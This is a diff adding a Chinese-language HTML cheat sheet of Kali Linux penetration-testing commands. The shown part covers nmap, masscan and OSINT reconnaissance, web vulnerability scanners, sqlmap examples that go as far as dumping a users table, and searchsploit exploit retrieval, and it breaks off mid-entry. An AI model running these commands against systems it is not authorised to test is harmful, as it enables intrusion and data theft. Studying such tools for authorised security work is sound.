@@ -1,0 +1,1866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>☠️ Kali Linux 指令速查手册</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+  :root {
+    --bg: #0f1117;
+    --bg-panel: #161822;
+    --bg-card: #1a1d2e;
+    --bg-card-hover: #1f2340;
+    --border: #262a40;
+    --border-light: #343860;
+    --text: #e2e6f0;
+    --text-secondary: #989cb8;
+    --text-muted: #5c6080;
+    --accent: #e63946;
+    --accent-glow: rgba(230,57,70,0.15);
+    --accent2: #f77f00;
+    --accent3: #457b9d;
+    --accent4: #2a9d8f;
+    --accent5: #8338ec;
+    --code-bg: #0c0e16;
+    --radius: 10px;
+    --radius-sm: 6px;
+    --shadow: 0 4px 24px rgba(0,0,0,0.4);
+    --transition: 0.25s ease;
+  }
+
+  body {
+    font-family: 'Noto Sans SC', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  ::-webkit-scrollbar { width:5px; }
+  ::-webkit-scrollbar-track { background:var(--bg); }
+  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+
+  /* ===== HEADER ===== */
+  header {
+    text-align:center;
+    padding:56px 24px 40px;
+    background: linear-gradient(180deg, rgba(230,57,70,0.06) 0%, transparent 100%);
+    border-bottom:1px solid var(--border);
+    position:relative;
+    overflow:hidden;
+  }
+
+  header::after {
+    content:'';
+    position:absolute;
+    bottom:0; left:15%;
+    width:70%; height:1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    opacity:.4;
+  }
+
+  .logo { font-size:56px; margin-bottom:8px; display:block; }
+  .title {
+    font-size: clamp(26px, 4.5vw, 42px);
+    font-weight:900;
+    letter-spacing:-1px;
+    color: var(--accent);
+  }
+  .subtitle { color:var(--text-secondary); font-size:15px; margin-top:6px; letter-spacing:1px; }
+  .subtitle span { color:var(--accent); font-weight:600; }
+
+  .meta-strip {
+    display:flex; justify-content:center; gap:24px; flex-wrap:wrap;
+    margin-top:20px;
+    padding:14px 20px;
+    background:var(--bg-panel);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    max-width:580px; margin-left:auto; margin-right:auto;
+  }
+  .meta-strip .m-item {
+    text-align:center;
+  }
+  .meta-strip .m-num {
+    font-family:'JetBrains Mono', monospace;
+    font-size:20px; font-weight:700;
+    color:var(--accent);
+  }
+  .meta-strip .m-label { font-size:12px; color:var(--text-muted); margin-top:1px; }
+
+  /* ===== NAV ===== */
+  .nav-wrap {
+    background:var(--bg-panel);
+    border-bottom:1px solid var(--border);
+    padding:12px 16px;
+    position:sticky; top:0; z-index:100;
+    display:flex; justify-content:center; flex-wrap:wrap; gap:6px;
+  }
+  .nav-btn {
+    padding:7px 16px;
+    border:1px solid var(--border);
+    border-radius:20px;
+    background:transparent;
+    color:var(--text-secondary);
+    font-family:'Noto Sans SC', sans-serif;
+    font-size:13px;
+    cursor:pointer;
+    transition:var(--transition);
+    white-space:nowrap;
+  }
+  .nav-btn:hover { border-color:var(--accent); color:var(--accent); background:rgba(230,57,70,0.06); }
+  .nav-btn.active { border-color:var(--accent); background:var(--accent); color:#fff; font-weight:600; }
+
+  /* ===== SEARCH ===== */
+  .search-area {
+    padding:20px 24px 0;
+    display:flex; justify-content:center;
+  }
+  .search-box {
+    position:relative;
+    width:100%; max-width:500px;
+  }
+  .search-box input {
+    width:100%;
+    padding:12px 48px 12px 18px;
+    background:var(--bg-card);
+    border:1px solid var(--border);
+    border-radius:30px;
+    color:var(--text);
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    outline:none;
+    transition:var(--transition);
+  }
+  .search-box input:focus {
+    border-color:var(--accent);
+    box-shadow:0 0 16px var(--accent-glow);
+  }
+  .search-box input::placeholder {
+    color:var(--text-muted);
+    font-family:'Noto Sans SC', sans-serif;
+  }
+  .search-box .s-icon {
+    position:absolute; right:16px; top:50%; transform:translateY(-50%);
+    color:var(--text-muted); font-size:18px; pointer-events:none;
+  }
+  .hint-key {
+    text-align:center;
+    padding:6px;
+    color:var(--text-muted);
+    font-size:12px;
+    font-family:'JetBrains Mono', monospace;
+  }
+  .hint-key kbd {
+    padding:2px 8px; border:1px solid var(--border); border-radius:4px;
+    background:var(--bg-card); font-size:11px; font-family:'JetBrains Mono', monospace;
+  }
+
+  /* ===== MAIN ===== */
+  main {
+    max-width:1200px;
+    margin:0 auto;
+    padding:24px 24px 60px;
+  }
+
+  /* ===== SECTION ===== */
+  .category-section { display:none; margin-bottom:44px; }
+  .category-section.active { display:block; animation:fadeIn .35s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
+
+  .cat-header {
+    display:flex; align-items:center; gap:10px;
+    margin-bottom:16px;
+    padding-bottom:10px;
+    border-bottom:1px solid var(--border);
+  }
+  .cat-header h2 { font-size:20px; font-weight:700; }
+  .cat-header .badge {
+    margin-left:auto;
+    font-family:'JetBrains Mono', monospace;
+    font-size:11px;
+    padding:3px 12px;
+    border-radius:20px;
+    background:var(--bg-card);
+    color:var(--text-muted);
+    border:1px solid var(--border);
+  }
+
+  /* ===== GRID ===== */
+  .cmd-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(360px,1fr)); gap:12px; }
+
+  /* ===== CARD ===== */
+  .cmd-card {
+    background:var(--bg-card);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    padding:18px 20px;
+    cursor:pointer;
+    transition:var(--transition);
+  }
+  .cmd-card:hover {
+    border-color:var(--border-light);
+    background:var(--bg-card-hover);
+  }
+  .cmd-card.open {
+    border-color:var(--accent);
+    box-shadow:0 0 20px var(--accent-glow);
+  }
+
+  .cmd-card .cmd-row {
+    display:flex; align-items:center; gap:8px;
+  }
+  .cmd-card .cmd-name {
+    font-family:'JetBrains Mono', monospace;
+    font-size:17px;
+    font-weight:600;
+    color:var(--accent);
+  }
+  .cmd-card .cmd-tag {
+    font-size:10px;
+    padding:2px 10px;
+    border-radius:10px;
+    font-weight:500;
+  }
+  .tag-info { background:rgba(69,123,157,.15); color:var(--accent3); }
+  .tag-vuln { background:rgba(247,127,0,.15); color:var(--accent2); }
+  .tag-web  { background:rgba(230,57,70,.15); color:var(--accent); }
+  .tag-pass { background:rgba(131,56,236,.15); color:var(--accent5); }
+  .tag-wifi { background:rgba(42,157,143,.15); color:var(--accent4); }
+  .tag-snif { background:rgba(247,127,0,.15); color:var(--accent2); }
+  .tag-post { background:rgba(230,57,70,.15); color:var(--accent); }
+  .tag-fore { background:rgba(42,157,143,.15); color:var(--accent4); }
+  .tag-rev  { background:rgba(131,56,236,.15); color:var(--accent5); }
+  .tag-util { background:rgba(69,123,157,.15); color:var(--accent3); }
+
+  .cmd-card .cmd-desc {
+    color:var(--text-secondary);
+    font-size:14px;
+    margin-top:4px;
+    line-height:1.6;
+  }
+
+  .cmd-card .cmd-detail {
+    max-height:0;
+    overflow:hidden;
+    transition:max-height .4s ease, opacity .3s ease, margin .3s ease;
+    opacity:0;
+  }
+  .cmd-card.open .cmd-detail {
+    max-height:700px;
+    opacity:1;
+    margin-top:14px;
+  }
+
+  .detail-label {
+    font-size:10px;
+    font-weight:700;
+    color:var(--text-muted);
+    text-transform:uppercase;
+    letter-spacing:1.2px;
+    margin-top:14px;
+    margin-bottom:6px;
+  }
+  .detail-label:first-child { margin-top:0; }
+
+  .code-block {
+    background:var(--code-bg);
+    border:1px solid var(--border);
+    border-radius:var(--radius-sm);
+    padding:12px 14px;
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    line-height:1.7;
+    overflow-x:auto;
+  }
+  .code-block .c0 { color:var(--accent); }
+  .code-block .c1 { color:var(--accent4); }
+  .code-block .c2 { color:var(--accent3); }
+  .code-block .c3 { color:var(--accent5); }
+  .code-block .c4 { color:var(--accent2); }
+  .code-block .cm { color:var(--text-muted); }
+  .code-block .cs { color:var(--text-secondary); }
+  .code-block .cp { color:#5c6080; }
+
+  .tip-box {
+    display:flex; align-items:flex-start; gap:8px;
+    padding:10px 14px;
+    background:rgba(230,57,70,.06);
+    border:1px solid rgba(230,57,70,.15);
+    border-radius:var(--radius-sm);
+    font-size:13px;
+    color:var(--accent);
+    margin-top:10px;
+  }
+  .tip-box .ti { flex-shrink:0; }
+
+  /* ===== NO RESULTS ===== */
+  .no-match { display:none; text-align:center; padding:60px 20px; color:var(--text-muted); }
+  .no-match.show { display:block; }
+  .no-match .nm-icon { font-size:48px; margin-bottom:12px; }
+  .no-match p { font-size:15px; }
+
+  /* ===== TOAST ===== */
+  .toast {
+    position:fixed; bottom:28px; left:50%;
+    transform:translateX(-50%) translateY(80px);
+    background:var(--accent); color:#fff;
+    padding:10px 24px; border-radius:30px;
+    font-size:14px; font-weight:600;
+    box-shadow:0 4px 20px rgba(230,57,70,.35);
+    opacity:0; transition:all .3s ease;
+    pointer-events:none; z-index:999;
+  }
+  .toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+
+  /* ===== FOOTER ===== */
+  footer {
+    text-align:center;
+    padding:28px 24px;
+    border-top:1px solid var(--border);
+    color:var(--text-muted);
+    font-size:13px;
+  }
+
+  /* ===== RESPONSIVE ===== */
+  @media (max-width:768px) {
+    header { padding:36px 16px 28px; }
+    .logo { font-size:42px; }
+    .cmd-grid { grid-template-columns:1fr; }
+    .nav-wrap { padding:10px 8px; gap:4px; }
+    .nav-btn { font-size:12px; padding:6px 12px; }
+    main { padding:18px 12px 40px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <span class="logo">☠️</span>
+  <h1 class="title">Kali Linux 指令速查手册</h1>
+  <p class="subtitle"><span>渗透测试</span> · <span>安全审计</span> · <span>每日必用</span></p>
+  <div class="meta-strip">
+    <div class="m-item"><div class="m-num">10</div><div class="m-label">分类</div></div>
+    <div class="m-item"><div class="m-num">60+</div><div class="m-label">精选指令</div></div>
+    <div class="m-item"><div class="m-num">🔴</div><div class="m-label">实战向</div></div>
+    <div class="m-item"><div class="m-num">⚡</div><div class="m-label">即查即用</div></div>
+  </div>
+</header>
+
+<nav class="nav-wrap" id="navWrap">
+  <button class="nav-btn active" data-cat="all">🔥 全部</button>
+  <button class="nav-btn" data-cat="info">🌐 信息收集</button>
+  <button class="nav-btn" data-cat="vuln">🔍 漏洞分析</button>
+  <button class="nav-btn" data-cat="web">🎯 Web 攻击</button>
+  <button class="nav-btn" data-cat="pass">🔑 密码攻击</button>
+  <button class="nav-btn" data-cat="wifi">📡 无线网络</button>
+  <button class="nav-btn" data-cat="snif">👃 嗅探/欺骗</button>
+  <button class="nav-btn" data-cat="post">💉 后渗透</button>
+  <button class="nav-btn" data-cat="fore">🔬 数字取证</button>
+  <button class="nav-btn" data-cat="rev">🔧 逆向工程</button>
+  <button class="nav-btn" data-cat="util">🧰 实用工具</button>
+</nav>
+
+<div class="search-area">
+  <div class="search-box">
+    <input type="text" id="searchInp" placeholder="搜索指令名称或用途… 如 nmap、hydra、端口扫描…">
+    <span class="s-icon">🔍</span>
+  </div>
+</div>
+<div class="hint-key"><kbd>Ctrl</kbd> + <kbd>F</kbd> 快速定位 · 点击卡片展开详情</div>
+
+<main id="mainContent">
+
+  <!-- ===================== 信息收集 ===================== -->
+  <section class="category-section active" data-cat="info">
+    <div class="cat-header">
+      <span style="font-size:22px">🌐</span>
+      <h2 style="color:var(--accent3)">信息收集</h2>
+      <span class="badge">8 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="nmap">
+        <div class="cmd-row">
+          <span class="cmd-name">nmap</span>
+          <span class="cmd-tag tag-info">扫描</span>
+        </div>
+        <div class="cmd-desc">网络扫描之王 —— 发现主机、端口、服务、操作系统</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">nmap</span> [选项] 目标</div>
+          <div class="detail-label">🔧 常用参数</div>
+          <div class="code-block">
+<span class="cm"># 扫描模式</span>
+<span class="c1">-sS</span>   SYN 半开扫描（默认，快且隐蔽）
+<span class="c1">-sT</span>   TCP 全连接扫描
+<span class="c1">-sV</span>   探测服务版本
+<span class="c1">-O</span>    识别操作系统
+<span class="c1">-A</span>    激进扫描（OS + 版本 + 脚本 + 路由）
+<span class="c1">-p-</span>   扫描全部 65535 端口
+<span class="c1">-T4</span>   加快扫描速度（0-5，4 较激进）
+          </div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 快速扫描常见端口</span>
+$ <span class="c0">nmap</span> <span class="c1">-T4</span> 192.168.1.1
+
+<span class="cp"># 全面扫描（服务 + 版本 + 系统 + 默认脚本）</span>
+$ <span class="c0">nmap</span> <span class="c1">-A</span> <span class="c1">-T4</span> scanme.nmap.org
+
+<span class="cp"># 扫描全网段 22 端口（找 SSH）</span>
+$ <span class="c0">nmap</span> <span class="c1">-p 22</span> <span class="c1">--open</span> 192.168.1.0/24
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>nmap 在 Kali 里预装，但部分扫描需要 root 权限（如 SYN 扫描）。<br><strong>nmap --script-help</strong> 查看所有 NSE 脚本，<strong>nmap --script vuln</strong> 跑漏洞扫描！</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="whois">
+        <div class="cmd-row">
+          <span class="cmd-name">whois</span>
+          <span class="cmd-tag tag-info">域名</span>
+        </div>
+        <div class="cmd-desc">查询域名注册信息（所有者、注册商、过期时间）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">whois</span> 域名/IP</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+$ <span class="c0">whois</span> baidu.com
+<span class="cs">&lt; 注册商、注册日期、Name Server、负责人等 &gt;</span>
+
+<span class="cp"># 也支持查 IP</span>
+$ <span class="c0">whois</span> 8.8.8.8
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>信息收集第一步！查域名所有者和注册邮箱，常作为社工入口。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="dnsenum">
+        <div class="cmd-row">
+          <span class="cmd-name">dnsenum</span>
+          <span class="cmd-tag tag-info">DNS</span>
+        </div>
+        <div class="cmd-desc">DNS 信息枚举 —— 子域名、MX 记录、区域传输等</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">dnsenum</span> [选项] 域名</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 默认枚举</span>
+$ <span class="c0">dnsenum</span> example.com
+
+<span class="cp"># 暴力破解子域名（指定字典）</span>
+$ <span class="c0">dnsenum</span> <span class="c1">-f</span> /usr/share/wordlists/dnsmap.txt example.com
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>子域名枚举 = 扩大攻击面。<strong>dnsrecon</strong> 是类似工具，也值得一试。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="theHarvester">
+        <div class="cmd-row">
+          <span class="cmd-name">theHarvester</span>
+          <span class="cmd-tag tag-info">OSINT</span>
+        </div>
+        <div class="cmd-desc">从搜索引擎、社交平台收集邮件、子域、IP 等</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">theHarvester</span> <span class="c1">-d</span> 域名 <span class="c1">-b</span> 数据源</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 从 baidu dump 收集信息</span>
+$ <span class="c0">theHarvester</span> <span class="c1">-d</span> example.com <span class="c1">-b</span> baidu
+
+<span class="cp"># 多数据源</span>
+$ <span class="c0">theHarvester</span> <span class="c1">-d</span> example.com <span class="c1">-b</span> google,linkedin
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="netdiscover">
+        <div class="cmd-row">
+          <span class="cmd-name">netdiscover</span>
+          <span class="cmd-tag tag-info">ARP</span>
+        </div>
+        <div class="cmd-desc">ARP 扫描 —— 发现局域网内的活跃主机</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">netdiscover</span> [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 被动监听 ARP 包</span>
+$ <span class="c0">sudo netdiscover</span> <span class="c1">-p</span>
+
+<span class="cp"># 主动扫描网段</span>
+$ <span class="c0">sudo netdiscover</span> <span class="c1">-r</span> 192.168.1.0/24
+
+<span class="cp"># 快速模式</span>
+$ <span class="c0">sudo netdiscover</span> <span class="c1">-i</span> eth0 <span class="c1">-r</span> 192.168.1.0/24 <span class="c1">-f</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>内网信息收集利器！不需要端口就能发现主机，比 nmap 快。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="dig">
+        <div class="cmd-row">
+          <span class="cmd-name">dig</span>
+          <span class="cmd-tag tag-info">DNS</span>
+        </div>
+        <div class="cmd-desc">DNS 查询工具（比 nslookup 更强大）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">dig</span> 域名 [记录类型]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 查 A 记录</span>
+$ <span class="c0">dig</span> example.com
+
+<span class="cp"># 查 MX 记录</span>
+$ <span class="c0">dig</span> example.com MX
+
+<span class="cp"># 查指定 DNS 服务器</span>
+$ <span class="c0">dig</span> @8.8.8.8 example.com
+
+<span class="cp"># 区域传输测试</span>
+$ <span class="c0">dig</span> axfr @ns1.example.com example.com
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="shodan">
+        <div class="cmd-row">
+          <span class="cmd-name">shodan</span>
+          <span class="cmd-tag tag-info">OSINT</span>
+        </div>
+        <div class="cmd-desc">Shodan CLI —— 搜索互联网设备（需 API Key）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">shodan</span> [命令] [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 搜索开放 22 端口的中国服务器</span>
+$ <span class="c0">shodan search</span> --limit 10 "port:22 country:CN"
+
+<span class="cp"># 查看指定 IP 的公开信息</span>
+$ <span class="c0">shodan host</span> 8.8.8.8
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>先 <strong>shodan init YOUR_API_KEY</strong> 初始化，免费版有限额。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="masscan">
+        <div class="cmd-row">
+          <span class="cmd-name">masscan</span>
+          <span class="cmd-tag tag-info">扫描</span>
+        </div>
+        <div class="cmd-desc">超高速端口扫描器 —— 号称"互联网扫描器"</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">masscan</span> [目标] <span class="c1">-p</span> 端口 [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 全端口扫描（快！）</span>
+$ <span class="c0">sudo masscan</span> 192.168.1.1 <span class="c1">-p0-65535</span> <span class="c1">--rate=1000</span>
+
+<span class="cp"># 扫描整个 B 段</span>
+$ <span class="c0">sudo masscan</span> 10.0.0.0/8 <span class="c1">-p80,443</span> <span class="c1">--rate=10000</span>
+          </div>
+          <div class="tip-box"><span class="ti">⚠️</span><span>masscan 速度极快，可以扫全互联网。确保你有合法授权！</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 漏洞分析 ===================== -->
+  <section class="category-section" data-cat="vuln">
+    <div class="cat-header">
+      <span style="font-size:22px">🔍</span>
+      <h2 style="color:var(--accent2)">漏洞分析</h2>
+      <span class="badge">6 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="nikto">
+        <div class="cmd-row">
+          <span class="cmd-name">nikto</span>
+          <span class="cmd-tag tag-vuln">Web</span>
+        </div>
+        <div class="cmd-desc">Web 服务器漏洞扫描器 —— 检查危险文件、配置问题</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">nikto</span> <span class="c1">-h</span> 目标 [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 基本扫描</span>
+$ <span class="c0">nikto</span> <span class="c1">-h</span> http://target.com
+
+<span class="cp"># 指定端口 + SSL</span>
+$ <span class="c0">nikto</span> <span class="c1">-h</span> target.com <span class="c1">-p</span> 443 <span class="c1">-ssl</span>
+
+<span class="cp"># 保存结果</span>
+$ <span class="c0">nikto</span> <span class="c1">-h</span> target.com <span class="c1">-o</span> result.html <span class="c1">-Format</span> HTML
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>nikto 在 Kali 预装，但扫描较慢。常用于最初的 Web 踩点。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="sqlmap">
+        <div class="cmd-row">
+          <span class="cmd-name">sqlmap</span>
+          <span class="cmd-tag tag-vuln">SQLi</span>
+        </div>
+        <div class="cmd-desc">自动化 SQL 注入检测与利用工具</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">sqlmap</span> <span class="c1">-u</span> URL [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 检测是否存在注入</span>
+$ <span class="c0">sqlmap</span> <span class="c1">-u</span> "http://target.com/page?id=1"
+
+<span class="cp"># POST 请求 + Cookie</span>
+$ <span class="c0">sqlmap</span> <span class="c1">-u</span> "http://target.com/login" <span class="c1">--data</span> "user=admin&pass=123" <span class="c1">--cookie</span> "PHPSESSID=..."
+
+<span class="cp"># 获取数据库列表</span>
+$ <span class="c0">sqlmap</span> <span class="c1">-u</span> "http://target.com/page?id=1" <span class="c1">--dbs</span>
+
+<span class="cp"># 获取表名</span>
+$ <span class="c0">sqlmap</span> <span class="c1">-u</span> "http://target.com/page?id=1" <span class="c1">-D</span> dbname <span class="c1">--tables</span>
+
+<span class="cp"># 获取数据</span>
+$ <span class="c0">sqlmap</span> <span class="c1">-u</span> "http://target.com/page?id=1" <span class="c1">-D</span> dbname <span class="c1">-T</span> users <span class="c1">--dump</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>sqlmap 太强了 —— 一条命令能从注入到拿下数据库。<strong>--batch</strong> 自动回答所有询问。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="openvas">
+        <div class="cmd-row">
+          <span class="cmd-name">openvas</span>
+          <span class="cmd-tag tag-vuln">综合</span>
+        </div>
+        <div class="cmd-desc">开源漏洞评估系统（Nessus 开源替代）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="cm"># Kali 2024+ 启动方式</span>
+$ <span class="c0">sudo gvm-setup</span>              <span class="cm"># 初始化（首次）</span>
+$ <span class="c0">sudo gvm-start</span>             <span class="cm"># 启动</span>
+$ <span class="c0">sudo gvm-check-setup</span>       <span class="cm"># 检查状态</span></div>
+          <div class="detail-label">💡 使用</div>
+          <div class="code-block">
+<span class="cp"># 启动后浏览器访问</span>
+https://127.0.0.1:9392
+<span class="cm"># 默认用户: admin  默认密码: 初始生成</span></div>
+          <div class="tip-box"><span class="ti">💡</span><span>GVM（原 OpenVAS）是全平台漏洞扫描，含 10 万+ NVT 规则。首次安装需要下载很久。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="searchsploit">
+        <div class="cmd-row">
+          <span class="cmd-name">searchsploit</span>
+          <span class="cmd-tag tag-vuln">查找</span>
+        </div>
+        <div class="cmd-desc">搜索 Exploit-DB 中的漏洞利用代码</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">searchsploit</span> [关键词]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 搜索 Apache 相关漏洞</span>
+$ <span class="c0">searchsploit</span> apache
+
+<span class="cp"># 精确搜索（加版本号）</span>
+$ <span class="c0">searchsploit</span> "Apache 2.4.49"
+
+<span class="cp"># 复制 exploit 到当前目录</span>
+$ <span class="c0">searchsploit</span> <span class="c1">-m</span> 12345.py
+
+<span class="cp"># 查看 exploit 详细信息</span>
+$ <span class="c0">searchsploit</span> <span class="c1">-x</span> 12345
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 离线缓存了 Exploit-DB 的全部内容！<strong>searchsploit -u</strong> 更新本地库。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="nmap_vuln">
+        <div class="cmd-row">
+          <span class="cmd-name">nmap --script vuln</span>
+          <span class="cmd-tag tag-vuln">扫描</span>
+        </div>
+        <div class="cmd-desc">Nmap NSE 漏洞扫描脚本 —— 一键检测常见漏洞</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">nmap --script vuln</span> 目标</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 跑全部漏洞脚本</span>
+$ <span class="c0">nmap --script vuln</span> <span class="c1">-sV</span> target.com
+
+<span class="cp"># 只跑特定漏洞</span>
+$ <span class="c0">nmap --script http-vuln*</span> target.com
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>不用装额外工具 —— nmap 自带 NSE 脚本就能扫很多常见漏洞！<br><strong>ls /usr/share/nmap/scripts/</strong> 查看所有脚本。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="wapiti">
+        <div class="cmd-row">
+          <span class="cmd-name">wapiti</span>
+          <span class="cmd-tag tag-vuln">Web</span>
+        </div>
+        <div class="cmd-desc">Web 应用漏洞扫描器（SQLi, XSS, 文件包含等）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">wapiti</span> <span class="c1">-u</span> URL [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+$ <span class="c0">wapiti</span> <span class="c1">-u</span> http://target.com <span class="c1">--scope</span> folder <span class="c1">-o</span> report.html
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>wapiti 生成 HTML 报告，比 nikto 更详细。支持登录会话！</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== Web 攻击 ===================== -->
+  <section class="category-section" data-cat="web">
+    <div class="cat-header">
+      <span style="font-size:22px">🎯</span>
+      <h2 style="color:var(--accent)">Web 攻击</h2>
+      <span class="badge">7 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="gobuster">
+        <div class="cmd-row">
+          <span class="cmd-name">gobuster</span>
+          <span class="cmd-tag tag-web">目录</span>
+        </div>
+        <div class="cmd-desc">目录/文件/DNS 暴力破解（Go 编写，速度快）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">gobuster dir</span> <span class="c1">-u</span> URL <span class="c1">-w</span> 字典</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 目录爆破</span>
+$ <span class="c0">gobuster dir</span> <span class="c1">-u</span> http://target.com <span class="c1">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+<span class="cp"># 加扩展名（找 .php .asp 等）</span>
+$ <span class="c0">gobuster dir</span> <span class="c1">-u</span> http://target.com <span class="c1">-w</span> dict.txt <span class="c1">-x</span> php,html,txt
+
+<span class="cp"># DNS 子域名爆破</span>
+$ <span class="c0">gobuster dns</span> <span class="c1">-d</span> example.com <span class="c1">-w</span> subdomains.txt
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 字典位置：<strong>/usr/share/wordlists/</strong>。<br>dirb 是同类工具，但 gobuster 更快（Go 多线程）。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="burpsuite">
+        <div class="cmd-row">
+          <span class="cmd-name">burpsuite</span>
+          <span class="cmd-tag tag-web">代理</span>
+        </div>
+        <div class="cmd-desc">Web 渗透测试集成平台（抓包、重放、爆破、扫描）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 启动</div>
+          <div class="code-block">
+<span class="cp"># Kali 启动</span>
+$ <span class="c0">burpsuite</span>
+<span class="cm"># 社区版免费，专业版收费</span>
+          </div>
+          <div class="detail-label">🔧 常用模块</div>
+          <div class="code-block">
+<span class="c2">Proxy</span>    拦截/修改 HTTP/HTTPS 请求
+<span class="c2">Repeater</span> 手动重放修改请求
+<span class="c2">Intruder</span> 自动化参数爆破（密码、IDOR）
+<span class="c2">Decoder</span>  URL/Base64/Hex 编解码
+<span class="c2">Scanner</span>  自动漏洞扫描（Pro 版）
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 预装了社区版。配合 FoxyProxy 浏览器插件使用最方便。<br>设置代理为 127.0.0.1:8080，装 CA 证书后就可以拦截 HTTPS。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="dirb">
+        <div class="cmd-row">
+          <span class="cmd-name">dirb</span>
+          <span class="cmd-tag tag-web">目录</span>
+        </div>
+        <div class="cmd-desc">基于字典的 Web 目录扫描</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">dirb</span> URL [字典] [选项]</div>
